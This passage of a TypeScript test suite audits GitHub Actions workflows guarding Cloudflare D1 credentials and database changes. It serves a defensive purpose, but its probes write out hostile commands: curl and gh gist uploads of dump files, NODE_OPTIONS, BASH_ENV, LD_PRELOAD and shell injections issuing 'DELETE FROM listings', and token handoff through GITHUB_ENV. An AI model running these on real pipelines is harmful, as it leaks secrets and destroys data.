    )
    return allowed ? problems : [...problems, `${step.uses} ${values.join(' ')} is not allowlisted`]
  }

  /** Secrets that are not Cloudflare credentials, by exact name. Every other secret counts as one. */
  const nonCloudflareSecrets = new Set([
    'GITHUB_TOKEN',
    'GSC_OAUTH_CLIENT_ID',
    'GSC_OAUTH_CLIENT_SECRET',
    'GSC_OAUTH_REFRESH_TOKEN',
    'GSC_QUOTA_PROJECT',
    'GSC_SERVICE_ACCOUNT_JSON',
    // Uploads source maps to Sentry during the deploy build (#48).
    'SENTRY_AUTH_TOKEN'
  ])
  /** The variables Wrangler reads a Cloudflare credential from, deprecated names included. */
  const cloudflareCredentialName = /(?:CLOUDFLARE|CF)_(?:API_TOKEN|API_KEY|EMAIL)/iu
  /**
   * True when `value` (a step, a job, or an `env`) can carry a Cloudflare credential: a
   * Wrangler credential name anywhere (any case), or a `secrets` reference in an expression
   * other than an exact `secrets.<name>` from `nonCloudflareSecrets` (so `secrets[...]`,
   * `toJSON(secrets)`, and `secrets.cloudflare_api_token` all count).
   */
  function tokenIn(value: unknown): boolean {
    const text = JSON.stringify(value ?? {})
    if (cloudflareCredentialName.test(text)) return true
    // Any `secrets` in the text, inside an expression or not, unless it is exactly
    // `secrets.<NAME>` for a reviewed name: no expression parsing to fool (#101 round 4).
    for (const match of text.matchAll(
      /(?<![A-Za-z0-9_])secrets(?![A-Za-z0-9_])(\.[A-Za-z0-9_]+)?/giu
    )) {
      const exact =
        match[0].startsWith('secrets.') && nonCloudflareSecrets.has(match[1]?.slice(1) ?? '')
      if (!exact) return true
    }
    return false
  }

  /** The step gets the token: from the workflow's or job's `env`, or its own `env` or `with`. */
  const stepHoldsToken = (workflow: WorkflowDefinition, job: WorkflowJob, step: WorkflowStep) =>
    tokenIn((workflow as { env?: unknown }).env) ||
    tokenIn(job.env) ||
    tokenIn((job as { container?: unknown }).container) ||
    tokenIn((job as { services?: unknown }).services) ||
    tokenIn(step)
  /** Some step of the job gets the token, or the job or workflow passes it to every step. */
  const jobHoldsToken = (workflow: WorkflowDefinition, job: WorkflowJob) =>
    tokenIn((workflow as { env?: unknown }).env) || tokenIn(job)

  /** Uploads and unreviewed actions in a job that holds the token, wherever the token is. */
  function credentialedJobViolations(workflows: Array<[string, WorkflowDefinition]>) {
    const jobs: string[] = []
    const violations: string[] = []
    for (const [file, workflow] of workflows) {
      for (const [name, job] of Object.entries(workflow.jobs)) {
        if (!jobHoldsToken(workflow, job)) continue
        jobs.push(`${file}:${name}`)
        // Nothing in the job may change what its steps run (#101 round 4): no container or
        // services, and no step writing GITHUB_ENV or GITHUB_PATH for the steps after it.
        for (const key of ['container', 'services'])
          if (key in job) violations.push(`${file}:${name}: a credentialed job may not set ${key}`)
        for (const step of stepsOf(job)) {
          if (step.run && /\bGITHUB_(?:ENV|PATH)\b/u.test(step.run))
            violations.push(
              `${file}:${name}: ${step.name ?? step.run.slice(0, 40)} writes GITHUB_ENV or GITHUB_PATH in a credentialed job`
            )
          if (step.uses && !credentialedJobActions.has(step.uses))
            violations.push(`${file}:${name}: ${step.uses} is not a reviewed action`)
          for (const upload of outboundUploads(step.run ?? ''))
            violations.push(`${file}:${name}: uploads with \`${upload}\``)
        }
      }
    }
    return { jobs: jobs.sort(), violations }
  }

  /**
   * Every step that gets the Cloudflare token and may change D1 (anything but a credential
   * check, a read-only release command, or the Worker deploy) must directly follow a successful
   * bookmark of its environment's database, in the same job, under the same condition.
   */
  function d1ChangeAudit(workflows: Array<[string, WorkflowDefinition]>) {
    const changes: string[] = []
    const violations: string[] = []
    for (const [file, workflow] of workflows) {
      for (const [name, job] of Object.entries(workflow.jobs)) {
        const steps = stepsOf(job)
        steps.forEach((step, index) => {
          if (!stepHoldsToken(workflow, job, step)) return
          const label = `${file}:${name}:${step.run?.trim() ?? step.uses}`
          if (tokenStepWithoutChanges(workflow, job, step)) return
          // No handoff: a later step without `env` could otherwise get the token.
          if (workflowCommandFiles.test(step.run ?? ''))
            violations.push(
              `${label}: a step holding the token may not write GITHUB_ENV, GITHUB_PATH, GITHUB_OUTPUT, or GITHUB_STATE`
            )
          const environment = environmentName(job)
          changes.push(`${file}:${name}:${environment}`)
          const problem = (message: string) => violations.push(`${label}: ${message}`)
          if (environment !== 'staging' && environment !== 'production') {
            problem('changes D1 outside the staging or production environment')
            return
          }
          const bookmark = steps[index - 1]
          if (
            bookmark?.run !== bookmarkCommand(environment) ||
            !tokenStepWithoutChanges(workflow, job, bookmark)
          )
            problem(`must directly follow a plain \`${bookmarkCommand(environment)}\` step`)
          if (bookmark?.if !== step.if) problem('must share its bookmark step’s condition')
          for (const checked of [bookmark, step]) {
            if (checked && statusFunction.test(String(checked.if ?? '')))
              problem(`\`if: ${checked.if}\` would run after a failed bookmark`)
            if (checked?.['continue-on-error'] !== undefined)
              problem('continue-on-error would let a failed bookmark through')
          }
          const database = step.env?.CLOUDFLARE_D1_DATABASE_ID
          if (database !== undefined && database !== project.remote[environment].databaseId)
            problem(`CLOUDFLARE_D1_DATABASE_ID is not the ${environment} database`)
        })
      }
    }
    return { changes: changes.sort(), violations }
  }

  it('recognises the D1 backup uploads this repository used to run', () => {
    const removed: WorkflowStep[] = [
      {
        uses: 'actions/upload-artifact@v7',
        with: {
          name: `best-serp-co-production-d1-pre-deploy-${expression('github.run_id')}`,
          path: `${expression('runner.temp')}/d1-backup/`
        }
      },
      // A neutral name and path is still refused: only reviewed artifacts are allowed.
      { uses: 'actions/upload-artifact@v7', with: { name: 'out', path: '/tmp/out/' } },
      { uses: 'actions/cache/save@v4', with: { key: 'k', path: 'db-export/' } },
      { uses: 'actions/cache@v5', with: { key: 'k', path: `${expression('runner.temp')}/out` } }
    ]
    for (const step of removed) expect(uploadViolations(step), JSON.stringify(step)).not.toEqual([])
    // The evidence the workflows do upload stays allowed.
    expect(
      uploadViolations({
        uses: 'actions/upload-artifact@v7',
        with: { name: 'playwright-report', path: 'apps/web/playwright-report/' }
      })
    ).toEqual([])
  })

  it('uploads or caches only the reviewed test evidence', () => {
    const steps = githubSteps()
    expect(steps.some(([, step]) => step.uses?.includes('upload-artifact'))).toBe(true)
    const offending = steps.flatMap(([file, step]) =>
      uploadViolations(step).map(problem => `${file}: ${step.name ?? step.uses}: ${problem}`)
    )
    expect(offending).toEqual([])
  })

  it('never exports a D1 database, in a workflow or a script', () => {
    for (const [file, step] of githubSteps()) {
      expect(step.run ?? '', `${file}: ${step.name}`).not.toMatch(
        /\bd1 export\b|cloudflare-release\.ts backup\b/u
      )
    }
    expect(Object.values(packageScripts).join('\n')).not.toMatch(/\bd1 export\b/u)
    // `backup` called `wrangler d1 export` through `d1(['export'], ...)`; any spelling of that
    // argument in a script is refused, whatever the command is called.
    const scripts = readdirSync(resolve('scripts'), { recursive: true, encoding: 'utf8' })
      .filter(file => /\.(?:m?js|ts)$/u.test(file) && !/\.test\./u.test(file))
      .filter(file =>
        /\bd1\s+export\b|['"`]export['"`]/u.test(readFileSync(resolve('scripts', file), 'utf8'))
      )
    expect(scripts).toEqual([])
  })

  it('keeps uploads off the network in every job that holds the Cloudflare token', () => {
    const { jobs, violations } = credentialedJobViolations(allWorkflows())
    expect(violations).toEqual([])
    // The check runs on every credentialed job, wherever the token is passed (#101 round 2).
    expect(jobs).toEqual([...credentialedJobs].sort())
    // The reviewer's probe: a token-less step in a credentialed job.
    const publish = loadWorkflow('publish-d1.yml')
    const job = publish.jobs.publish as WorkflowJob
    const probe: WorkflowDefinition = {
      ...publish,
      jobs: {
        publish: {
          ...job,
          steps: [
            ...stepsOf(job),
            {
              run: 'gh gist create --public "$RUNNER_TEMP/out.json" && curl -T "$RUNNER_TEMP/out.json" https://example.com/'
            },
            { uses: 'some-org/some-action@v1' }
          ]
        }
      }
    }
    expect(credentialedJobViolations([['publish-d1.yml', probe]]).violations).toEqual([
      'publish-d1.yml:publish: uploads with `gh gist create --public "$RUNNER_TEMP/out.json"`',
      'publish-d1.yml:publish: uploads with `curl -T "$RUNNER_TEMP/out.json" https://example.com/`',
      'publish-d1.yml:publish: some-org/some-action@v1 is not a reviewed action'
    ])
    for (const command of [
      'gh release upload v1 dump.sql',
      'gh release create v1 dump.sql',
      'gh api repos/o/r/issues -F body=@dump.sql',
      'curl -sS -T dump.sql https://example.com/',
      'curl -sST dump.sql https://example.com/',
      'curl --upload-file dump.sql https://example.com/',
      'curl -F file=@dump.sql https://example.com/',
      'curl --form "file=@dump.sql" https://example.com/',
      'curl -d @dump.sql https://example.com/',
      'curl -d@dump.sql https://example.com/',
      "curl --data-binary '@dump.sql' https://example.com/",
      '/usr/bin/curl --data-binary=@dump.sql https://example.com/',
      'wget --post-file=dump.sql https://example.com/',
      'wget --method=PUT --body-file=dump.sql https://example.com/'
    ]) {
      expect(outboundUploads(command), command).toEqual([command])
    }
    // The HTTP gates read headers with curl and split them with awk: not an upload.
    for (const command of [
      `server="$(curl -sSI https://best.serp.co | tr -d '\\r' | awk -F': ' 'tolower($1) == "server" { print $2 }')"`,
      'curl -sS -d "name=value" https://example.com/',
      'gh workflow run x.yml'
    ]) {
      expect(outboundUploads(command), command).toEqual([])
    }
  })

  it('bookmarks D1 directly before every step that can change it, and only after success', () => {
    const { changes, violations } = d1ChangeAudit(allWorkflows())
    expect(violations).toEqual([])
    expect(changes).toEqual([...bookmarkedChanges].sort())
  })

  it('refuses a change that could run after a failed or missing bookmark (#101 review)', () => {
    const publish = loadWorkflow('publish-d1.yml')
    const job = publish.jobs.publish as WorkflowJob
    const at = stepIndex(job, 'db:publish:production')
    const edited = (edit: (steps: WorkflowStep[]) => void): WorkflowDefinition => {
      const steps = structuredClone(stepsOf(job))
      edit(steps)
      return { ...publish, jobs: { ...publish.jobs, publish: { ...job, steps } } }
    }
    const audit = (workflow: WorkflowDefinition) =>
      d1ChangeAudit([['publish-d1.yml', workflow]]).violations.join('\n')
    expect(audit(publish)).toBe('')
    // The reviewer's probe: `always()` on both steps runs the publish after a failed bookmark.
    for (const condition of ['always()', 'failure()', '!cancelled()', 'success() || true']) {
      expect(
        audit(
          edited(steps => {
            for (const step of [steps[at - 1], steps[at]]) if (step) step.if = condition
          })
        ),
        condition
      ).toContain('would run after a failed bookmark')
    }
    expect(
      audit(
        edited(steps => {
          if (steps[at - 1]) steps[at - 1]['continue-on-error'] = true
        })
      )
    ).toContain('continue-on-error')
    // A bookmark skipped by its own condition counts as success, so conditions must match.
    expect(
      audit(
        edited(steps => {
          if (steps[at - 1]) steps[at - 1].if = 'false'
        })
      )
    ).toContain('condition')
    expect(audit(edited(steps => steps.splice(at - 1, 1)))).toContain('must directly follow')
    expect(
      audit(
        edited(steps => {
          const change = steps[at]
          if (change?.env) change.env.CLOUDFLARE_D1_DATABASE_ID = project.remote.staging.databaseId
        })
      )
    ).toContain('is not the production database')
  })

  it('finds D1 changes by credential, not by script name (#101 review)', () => {
    const token = {
      CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
      CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN')
    }
    const workflow = (steps: WorkflowStep[]): WorkflowDefinition => ({
      jobs: { cleanup: { environment: 'production', 'runs-on': 'ubuntu-latest', steps } },
      on: { workflow_dispatch: null }
    })
    for (const step of [
      {
        env: token,
        run: 'pnpm exec wrangler d1 execute best-serp-co-production --remote --env production --command "DELETE FROM listings"'
      },
      { env: token, run: 'pnpm tsx scripts/d1-remote-publisher.ts d1/publications/x.yaml' },
      {
        env: token,
        run: 'curl -sS -X POST "https://api.cloudflare.com/client/v4/accounts/x/d1/database/y/query"'
      },
      { env: token, uses: './.github/actions/anything' },
      // Round 2 probes: launchers the old program list did not know.
      { env: token, run: 'npm run db:publish:production -- d1/publications/x.yaml' },
      {
        env: token,
        run: './node_modules/.bin/wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"'
      },
      { env: token, run: './scripts/x.sh' },
      { env: token, run: 'if [ -z "$CLOUDFLARE_API_TOKEN" ]; then exit 1; fi; ./scripts/x.sh' }
    ] satisfies WorkflowStep[]) {
      const { changes, violations } = d1ChangeAudit([['cleanup.yml', workflow([step])]])
      expect(changes, JSON.stringify(step)).toEqual(['cleanup.yml:cleanup:production'])
      expect(violations.join('\n'), JSON.stringify(step)).toContain('must directly follow')
    }
    // With its bookmark in front, the same change passes.
    const guarded = d1ChangeAudit([
      [
        'cleanup.yml',
        workflow([
          { env: token, run: bookmarkCommand('production') },
          { env: token, run: 'pnpm tsx scripts/d1-remote-publisher.ts d1/publications/x.yaml' }
        ])
      ]
    ])
    expect(guarded.violations).toEqual([])
    // Only the exact credential checks, read-only release commands, the Worker deploy, and the
    // Deploy Production plan are not D1 changes.
    const reads = d1ChangeAudit([
      [
        'reads.yml',
        workflow([
          {
            env: token,
            run: 'if [ -z "$CLOUDFLARE_API_TOKEN" ] || [ -z "$CLOUDFLARE_ACCOUNT_ID" ]; then\n  echo "::error::Missing secrets."\n  exit 1\nfi\n'
          },
          { env: token, run: 'pnpm tsx scripts/cloudflare-release.ts verify-import production' },
          { env: token, run: 'pnpm tsx scripts/cloudflare-release.ts deploy production' }
        ])
      ]
    ])
    expect(reads).toEqual({ changes: [], violations: [] })
  })

  it('exempts exactly the R2-only media upload; any variant needs a bookmark (#97)', () => {
    // The scripts the exemption names run the R2-only uploader and nothing else.
    expect(packageScripts['media:upload:staging']).toBe(
      'pnpm tsx scripts/media-upload.ts --target=staging'
    )
    expect(packageScripts['media:upload:production']).toBe(
      'pnpm tsx scripts/media-upload.ts --target=production'
    )
    // The uploader reaches Cloudflare only through the R2 objects API: its imports are these,
    // and its one Cloudflare URL is an R2 bucket object.
    const imports = (file: string) =>
      [...readFileSync(resolve(file), 'utf8').matchAll(/^import [^;]*?from '([^']+)'/gmsu)]
        .map(match => match[1])
        .sort()
    expect(imports('scripts/media-upload.ts')).toEqual([
      '../apps/web/src/db/media-format',
      '../apps/web/src/db/media-keys',
      '../apps/web/src/db/safe-fetch',
      '../apps/web/src/db/safe-fetch-node',
      './project',
      './r2-objects',
      'node:crypto',
      'node:fs',
      'node:path',
      'node:url',
      'zod'
    ])
    expect(imports('scripts/r2-objects.ts')).toEqual([
      '../apps/web/src/db/media-keys',
      'node:crypto'
    ])
    const r2 = readFileSync(resolve('scripts/r2-objects.ts'), 'utf8')
    const placeholder = (name: string) => `\${${name}}`
    expect(r2.match(/api\.cloudflare\.com[^`'"]*/gu)).toEqual([
      // A bucket's objects: listed, read, and written (#95 release blocker 3), nothing else.
      `api.cloudflare.com/client/v4/accounts/${placeholder('accountId')}/r2/buckets/${placeholder('bucket')}/objects`
    ])
    expect(readFileSync(resolve('scripts/media-upload.ts'), 'utf8')).not.toMatch(
      /api\.cloudflare\.com/u
    )
    const audit = d1ChangeAudit(allWorkflows())
    expect(audit.violations).toEqual([])
    expect(audit.changes.filter(change => change.startsWith('upload-media'))).toEqual([])
    const upload = loadWorkflow('upload-media-staging.yml')
    const job = upload.jobs.upload as WorkflowJob
    const at = stepIndex(job, 'media:upload:staging')
    const withUpload = (step: WorkflowStep, jobExtra: Partial<WorkflowJob> = {}) => {
      const steps = [...stepsOf(job)]
      steps[at] = step
      return d1ChangeAudit([
        [
          'upload-media-staging.yml',
          { ...upload, jobs: { upload: { ...job, ...jobExtra, steps } } }
        ]
      ])
    }
    const original = stepsOf(job)[at] as WorkflowStep
    expect(withUpload(original).changes).toEqual([])
    // Each variant is a change without a bookmark: refused.
    const variants: Array<[string, WorkflowStep, Partial<WorkflowJob>]> = [
      ['another target', { ...original, run: 'pnpm media:upload:dry-run -- "$PLAN_PATH"' }, {}],
      [
        'an appended command',
        { ...original, run: `${original.run} && pnpm db:publish:staging` },
        {}
      ],
      [
        'a second argument',
        { ...original, run: 'pnpm media:upload:staging -- "$PLAN_PATH" x' },
        {}
      ],
      [
        'the script by path',
        { ...original, run: 'pnpm tsx scripts/media-upload.ts --target=staging' },
        {}
      ],
      [
        'an unreviewed env',
        { ...original, env: { ...original.env, NODE_OPTIONS: '--require ./x.js' } },
        {}
      ],
      ['a shell', { ...original, shell: 'bash -e {0}' } as WorkflowStep, {}],
      ['job env', original, { env: { BASH_ENV: 'scripts/evil.sh' } }]
    ]
    for (const [label, step, jobExtra] of variants) {
      const result = withUpload(step, jobExtra)
      // A job-wide env reaches the credential check too, so it may count more than once.
      expect(result.changes, label).toContain('upload-media-staging.yml:upload:staging')
      expect(result.violations.join('\n'), label).toMatch(/must directly follow a plain/u)
    }
  })

  it('exempts exactly the read-only media health check; any variant needs a bookmark (#122)', () => {
    expect(packageScripts['media:health']).toBe('pnpm tsx scripts/media-health.ts')
    expect(packageScripts['media:health:issue']).toBe('pnpm tsx scripts/media-health-issue.ts')
    const imports = (file: string) =>
      [...readFileSync(resolve(file), 'utf8').matchAll(/^import [^;]*?from '([^']+)'/gmsu)]
        .map(match => match[1])
        .sort()
    expect(imports('scripts/media-health.ts')).toEqual([
      '../apps/web/src/db/media-format',
      '../apps/web/src/db/media-keys',
      './cloudflare-release',
      './project',
      './r2-objects',
      'node:fs',
      'node:path',
      'node:url'
    ])
    // Reads only: the D1 target's `query` with one SELECT, the R2 list, and HEADs.
    const health = readFileSync(resolve('scripts/media-health.ts'), 'utf8')
    expect(health).not.toMatch(
      /executeFile|applyMigrations|putR2Object|getR2Object|api\.cloudflare\.com|method: '(?!HEAD')[A-Z]+'/u
    )
    expect(health.match(/\.query\(/gu)).toHaveLength(1)
    expect(MEDIA_HEALTH_SQL).toMatch(/^SELECT\b/u)
    expect(MEDIA_HEALTH_SQL).not.toMatch(
      /;|\b(?:INSERT|UPDATE|DELETE|REPLACE|DROP|ALTER|CREATE|PRAGMA|ATTACH|VACUUM)\b/iu
    )
    // The issue step files the report with the job's token alone.
    expect(readFileSync(resolve('scripts/media-health-issue.ts'), 'utf8')).not.toMatch(
      /CLOUDFLARE|cloudflare-release|r2-objects/u
    )
    const workflow = loadWorkflow(mediaHealthWorkflow)
    const job = workflow.jobs.check as WorkflowJob
    expect(stepRunning(job, 'media:health -- production').env).toEqual({
      CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
      CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN')
    })
    expect(stepRunning(job, 'media:health:issue').env).toEqual({
      GITHUB_TOKEN: expression('github.token')
    })
    expect(job.permissions).toEqual({ contents: 'read', issues: 'write' })
    // The checkout leaves no GITHUB_TOKEN behind for the Cloudflare step (#123 review S2).
    const checkout = stepsOf(job).find(step => step.uses?.startsWith('actions/checkout@'))
    expect(checkout?.with?.['persist-credentials']).toBe(false)
    expect(workflow.on.schedule).toHaveLength(1)

    const audit = d1ChangeAudit([[mediaHealthWorkflow, workflow]])
    expect(audit).toEqual({ changes: [], violations: [] })
    const at = stepIndex(job, 'media:health -- production')
    const original = stepsOf(job)[at] as WorkflowStep
    const withStep = (step: WorkflowStep) => {
      const steps = [...stepsOf(job)]
      steps[at] = step
      return d1ChangeAudit([
        [mediaHealthWorkflow, { ...workflow, jobs: { check: { ...job, steps } } }]
      ])
    }
    for (const [label, step] of [
      [
        'an appended command',
        { ...original, run: `${original.run} && pnpm db:publish:production` }
      ],
      ['another script', { ...original, run: 'pnpm tsx scripts/media-health.ts production' }],
      ['an unreviewed env', { ...original, env: { ...original.env, NODE_OPTIONS: '--require x' } }]
    ] as Array<[string, WorkflowStep]>) {
      const result = withStep(step)
      expect(result.changes, label).toEqual(['media-health.yml:check:production-media-health'])
      expect(result.violations.join('\n'), label).toMatch(/outside the staging or production/u)
    }
  })

  it('exempts a reviewed command only when nothing else can change what it runs (#101 round 3)', () => {
    const publish = loadWorkflow('publish-d1.yml')
    const job = publish.jobs.publish as WorkflowJob
    const token = {
      CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
      CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN')
    }
    const exempt = 'pnpm tsx scripts/cloudflare-release.ts check-database production'
    const appended = (step: WorkflowStep, jobOverrides: Partial<WorkflowJob> = {}) =>
      d1ChangeAudit([
        [
          'publish-d1.yml',
          {
            ...publish,
            jobs: { publish: { ...job, ...jobOverrides, steps: [...stepsOf(job), step] } }
          }
        ]
      ])
    // Without anything else, the reviewed read-only command stays exempt.
    expect(appended({ env: token, run: exempt })).toEqual({
      changes: [...bookmarkedChanges].filter(change => change.startsWith('publish-d1.yml')),
      violations: []
    })
    // The reviewer's probes: each turns the exempt command into a change without a bookmark.
    for (const [label, step, jobOverrides] of [
      [
        'NODE_OPTIONS',
        {
          env: {
            ...token,
            NODE_OPTIONS:
              "--import=data:text/javascript,import('node:child_process').then(c=>c.execSync('npx wrangler d1 execute best-serp-co-production --remote --command \"DELETE FROM listings\"'))"
          },
          run: exempt
        },
        {}
      ],
      [
        'shell',
        {
          env: token,
          run: exempt,
          shell:
            'bash -c \'pnpm exec wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"; bash {0}\''
        },
        {}
      ],
      ['BASH_ENV', { env: { ...token, BASH_ENV: 'scripts/evil.sh' }, run: exempt }, {}],
      ['working-directory', { env: token, run: exempt, 'working-directory': 'evil' }, {}],
      ['job defaults', { env: token, run: exempt }, { defaults: { run: { shell: 'evil {0}' } } }],
      ['job env', { env: token, run: exempt }, { env: { LD_PRELOAD: '/tmp/evil.so' } }]
    ] as Array<[string, WorkflowStep, Partial<WorkflowJob>]>) {
      const audit = appended(step, jobOverrides)
      expect(audit.changes, label).toContain('publish-d1.yml:publish:production')
      expect(audit.violations.join('\n'), label).toContain('must directly follow')
    }
    // A bookmark step with an extra env is not a bookmark.
    const at = stepIndex(job, 'db:publish:production')
    const steps = structuredClone(stepsOf(job))
    const bookmark = steps[at - 1]
    if (bookmark?.env) bookmark.env.NODE_OPTIONS = '--require ./evil.js'
    expect(
      d1ChangeAudit([
        ['publish-d1.yml', { ...publish, jobs: { publish: { ...job, steps } } }]
      ]).violations.join('\n')
    ).toContain('must directly follow a plain')
  })

  it('treats any secret but the reviewed ones, in any spelling, as a credential (#101 round 3)', () => {
    const workflow = (step: WorkflowStep, env?: Record<string, string>): WorkflowDefinition => ({
      ...(env ? { env } : {}),
      jobs: { cleanup: { environment: 'production', 'runs-on': 'ubuntu-latest', steps: [step] } },
      on: { workflow_dispatch: null }
    })
    const destroy =
      'pnpm exec wrangler d1 execute best-serp-co-production --remote --env production --command "DELETE FROM listings"'
    for (const [label, definition] of [
      [
        'CF_API_TOKEN and a lower-case secret name',
        workflow({
          env: {
            CF_API_TOKEN: expression('secrets.cloudflare_api_token'),
            CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID')
          },
          run: destroy
        })
      ],
      [
        'toJSON(secrets)',
        workflow({
          env: { ALL: expression('toJSON(secrets)') },
          run: `CLOUDFLARE_API_TOKEN="$(jq -r '.["CLOUDFLARE_" + "API_TOKEN"]' <<<"$ALL")" ${destroy}`
        })
      ],
      ['secrets[...]', workflow({ env: { T: expression("secrets['DEPLOY']") }, run: destroy })],
      ['an unknown secret', workflow({ env: { T: secret('DEPLOY_KEY') }, run: destroy })],
      ['a workflow-level secret', workflow({ run: destroy }, { T: secret('DEPLOY_KEY') })],
      [
        'a global API key',
        workflow({ env: { cf_api_key: secret('GSC_QUOTA_PROJECT') }, run: destroy })
      ]
    ] as Array<[string, WorkflowDefinition]>) {
      const audit = d1ChangeAudit([['cleanup.yml', definition]])
      expect(audit.changes, label).toEqual(['cleanup.yml:cleanup:production'])
      expect(audit.violations.join('\n'), label).toContain('must directly follow')
    }
    // GitHub's own token and the reviewed Search Console secrets are not Cloudflare credentials.
    for (const env of [
      { T: expression('secrets.GITHUB_TOKEN') },
      { T: secret('GSC_QUOTA_PROJECT') }
    ]) {
      expect(d1ChangeAudit([['ok.yml', workflow({ env, run: 'node x.mjs' })]]).changes).toEqual([])
    }
  })

  it('keeps earlier steps, containers, and services from changing a credentialed job (#101 round 4)', () => {
    const publish = loadWorkflow('publish-d1.yml')
    const job = publish.jobs.publish as WorkflowJob
    const bookmarkAt = stepIndex(job, 'cloudflare-release.ts bookmark production')
    const edited = (edit: (job: WorkflowJob & Record<string, unknown>) => void) => {
      const copy = structuredClone(job) as WorkflowJob & Record<string, unknown>
      edit(copy)
      return credentialedJobViolations([
        ['publish-d1.yml', { ...publish, jobs: { publish: copy } }]
      ]).violations.join('\n')
    }
    // A token-less step before an exempt one sets NODE_OPTIONS, or puts a pnpm shim on PATH.
    expect(
      edited(copy =>
        copy.steps?.splice(bookmarkAt, 0, {
          run: 'echo "NODE_OPTIONS=--require ./evil.js" >> "$GITHUB_ENV"'
        })
      )
    ).toContain('writes GITHUB_ENV or GITHUB_PATH')
    expect(
      edited(copy =>
        copy.steps?.splice(bookmarkAt, 0, {
          run: 'mkdir -p "$RUNNER_TEMP/bin" && printf "#!/bin/sh\\nevil" > "$RUNNER_TEMP/bin/pnpm" && echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"'
        })
      )
    ).toContain('writes GITHUB_ENV or GITHUB_PATH')
    // A job container or services change where and how every step runs.
    expect(
      edited(copy => {
        copy.container = {
          image: 'evil/image:latest',
          env: { NODE_OPTIONS: '--require ./evil.js' }
        }
      })
    ).toContain('may not set container')
    expect(
      edited(copy => {
        copy.services = { db: { image: 'postgres', env: { X: '1' } } }
      })
    ).toContain('may not set services')
    // container.env with the token reaches a step that has no env of its own.
    const containerToken = structuredClone(job) as WorkflowJob & Record<string, unknown>
    containerToken.container = {
      image: 'node:24',
      env: { CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN') }
    }
    containerToken.steps = [
      ...stepsOf(containerToken),
      {
        run: 'pnpm exec wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"'
      }
    ]
    expect(
      d1ChangeAudit([
        ['publish-d1.yml', { ...publish, jobs: { publish: containerToken } }]
      ]).violations.join('\n')
    ).toContain('must directly follow')
  })

  it('counts every `secrets` in the text, not only parsed expressions (#101 round 4)', () => {
    const workflow = (step: WorkflowStep): WorkflowDefinition => ({
      jobs: { cleanup: { environment: 'production', 'runs-on': 'ubuntu-latest', steps: [step] } },
      on: { workflow_dispatch: null }
    })
    const destroy =
      'pnpm exec wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"'
    for (const [label, step] of [
      [
        '`}}` inside a string literal',
        {
          env: {
            T: expression("format('}}{0}', secrets[format('CLOUDFLARE{0}API_TOKEN', '_')])")
          },
          run: `export "$(printf 'CLOUDFLARE_%s' API_TOKEN)=\${T:2}"; ${destroy}`
        }
      ],
      [
        'a mixed-case reference',
        { env: { T: expression('secrets.CloudFlare_Api_Token') }, run: destroy }
      ],
      [
        'an allowed secret OR another one',
        { env: { T: expression('secrets.GITHUB_TOKEN || secrets.DEPLOY') }, run: destroy }
      ],
      ['SECRETS in capitals', { env: { T: expression('SECRETS.GITHUB_TOKEN') }, run: destroy }]
    ] as Array<[string, WorkflowStep]>) {
      const audit = d1ChangeAudit([['cleanup.yml', workflow(step)]])
      expect(audit.changes, label).toEqual(['cleanup.yml:cleanup:production'])
      expect(audit.violations.join('\n'), label).toContain('must directly follow')
    }
  })

  it('refuses to hand the token to a later step (#101 round 2)', () => {
    const token = {
      CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
      CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN')
    }
    // The reviewer's probe: the token goes to GITHUB_ENV, and a step without `env` uses it.
    const handoff: WorkflowDefinition = {
      jobs: {
        cleanup: {
          environment: 'production',
          'runs-on': 'ubuntu-latest',
          steps: [
            {
              env: token,
              run: 'echo "CLOUDFLARE_API_TOKEN=$CLOUDFLARE_API_TOKEN" >> "$GITHUB_ENV"'
            },
            {
              run: 'pnpm exec wrangler d1 execute best-serp-co-production --remote --command "DELETE FROM listings"'
            }
          ]
        }
      },
      on: { workflow_dispatch: null }
    }
    const audit = d1ChangeAudit([['cleanup.yml', handoff]])
    expect(audit.violations.join('\n')).toContain('may not write GITHUB_ENV')
    expect(audit.violations.join('\n')).toContain('must directly follow')
    for (const file of ['GITHUB_PATH', 'GITHUB_OUTPUT', 'GITHUB_STATE']) {
      const step = { env: token, run: `echo "x=1" >> "$${file}"` }
      expect(
        d1ChangeAudit([
          [
            'cleanup.yml',
            { ...handoff, jobs: { cleanup: { ...handoff.jobs.cleanup, steps: [step] } } }
          ]
        ]).violations.join('\n'),
        file
      ).toContain('may not write')
    }
    // A job-level token reaches every step, so every step is audited.
    const jobWide: WorkflowDefinition = {
      jobs: {
        cleanup: {
          env: token,
          environment: 'production',
          'runs-on': 'ubuntu-latest',
          steps: [{ run: 'node scripts/anything.mjs' }]
        }
      },
      on: { workflow_dispatch: null }
    }
    expect(d1ChangeAudit([['cleanup.yml', jobWide]]).changes).toEqual([
      'cleanup.yml:cleanup:production'
    ])
  })
})

describe('staging catalog publication and media uploads (#95)', () => {
  /** The unprivileged checks every dispatch-only data workflow runs before its environment. */
  function expectAuthorizedDispatch(
    file: string,
    branch: 'main' | 'staging',
    environment: 'production' | 'staging',
    confirmation: string,
    privilegedJob: string
  ): WorkflowJob {
    const workflow = loadWorkflow(file)
    expect(Object.keys(workflow.on), file).toEqual(['workflow_dispatch'])
    expect(workflow.permissions, file).toEqual({ contents: 'read' })
    expect(Object.keys(workflow.jobs).sort(), file).toEqual(['authorize', privilegedJob].sort())
    const authorize = workflow.jobs.authorize as WorkflowJob
    expect(authorize.environment, file).toBeUndefined()
    expect(JSON.stringify(authorize), file).not.toContain('secrets.')
    const checks = runs(authorize).join('\n')
    expect(checks, file).toContain(`"$GITHUB_REF" != "refs/heads/${branch}"`)
